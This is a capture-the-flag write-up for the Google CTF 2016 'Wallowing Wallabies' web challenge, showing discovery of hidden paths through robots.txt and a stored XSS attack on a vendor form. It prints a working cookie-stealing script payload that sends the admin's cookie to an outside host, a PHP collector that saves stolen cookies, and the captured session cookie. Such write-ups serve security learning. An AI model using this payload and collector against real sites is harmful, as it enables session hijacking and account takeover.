---
title: "Wallowing Wallabies Web 25 - Google CTF 2016"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["xss", "wallowing", "wallabies", "web", "web-exploitation", "wallowing-wallabies-web-25"]
summary: "Wallowing Wallabies provides enterprise contract management - we'd like to find out how easy it is to perform corporate espionage against them."
source:
  name: "bl4de/ctf"
  url: "https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2016/Google_CTF_2016/Wallowing_Wallabies_Web_25/README.md"
ctf:
  name: "Google CTF"
  year: 2016
  challenge: "Wallowing Wallabies Web 25"
---

## Source

- **CTF:** Google CTF 2016
- **Challenge:** Wallowing Wallabies Web 25
- **Repository:** [bl4de/ctf](https://github.com/bl4de/ctf)
- **File:** <https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2016/Google_CTF_2016/Wallowing_Wallabies_Web_25/README.md>

---
# Wallowing Wallabies (Web, 25pts)

## Problem

Wallowing Wallabies provides enterprise contract management - we'd like to find out how easy it is to perform corporate espionage against them. 

## Solution


We've got web page with no visible navigation or form except Home page:

![Wallowing Wallabies](https://raw.githubusercontent.com/bl4de/ctf/7e48b1a697a898ac7a1e6856a91041afa529a8be/2016/Google_CTF_2016/Wallowing_Wallabies_Web_25/assets/1.png)

Quick look at _robots.txt_ reveals some hidden content:

```

User-agent: *
Disallow: /deep-blue-sea/
Disallow: /deep-blue-sea/team/
# Yes, these are alphabet puns :)
Disallow: /deep-blue-sea/team/characters
Disallow: /deep-blue-sea/team/paragraphs
Disallow: /deep-blue-sea/team/lines
Disallow: /deep-blue-sea/team/runes
Disallow: /deep-blue-sea/team/vendors

```

Web page at _/deep-blue-sea/team/vendors_ contains form with two fields:

![Wallowing Wallabies](https://raw.githubusercontent.com/bl4de/ctf/7e48b1a697a898ac7a1e6856a91041afa529a8be/2016/Google_CTF_2016/Wallowing_Wallabies_Web_25/assets/2.png)

Text field was vulnerable to XSS and allows to put payload with simple JavaScript to steal cookie:

```HTML

<script src="bootstrap.min.js">
</script>
<script>document.write('<img src="http://sword.x10host.com/?c='+document.cookie+'"/>');
</script>

```

This payload was saved in message sent to site admin.
At _http://sword.x10host.com/_ simple PHP script saves stolen cookie:

```PHP
<?php

if (isset($_GET["c"])) {
	$cookie = $_GET["c"];
	file_put_contents("cookies.txt", $cookie);
}

```

After a couple of minutes someone "read" message and _cookies.txt_ file on _sword.x10host.com_ contains cookie:

```
green-mountains=eyJub25jZSI6ImUxNjgwMjcyYTcxNDE3MjMiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vdmVuZG9ycy4qJCIsImV4cGlyeSI6MTQ2MjAzMTg2OH0=|1462031865|d985a99f12846cd73da3b9b01b3b921fd15512e3
```

![Wallowing Wallabies](https://raw.githubusercontent.com/bl4de/ctf/7e48b1a697a898ac7a1e6856a91041afa529a8be/2016/Google_CTF_2016/Wallowing_Wallabies_Web_25/assets/3.png)

Refresh of Wallowing Wallabies page with stolen cookie revealed the flag:

![Wallowing Wallabies](https://raw.githubusercontent.com/bl4de/ctf/7e48b1a697a898ac7a1e6856a91041afa529a8be/2016/Google_CTF_2016/Wallowing_Wallabies_Web_25/assets/4.png)
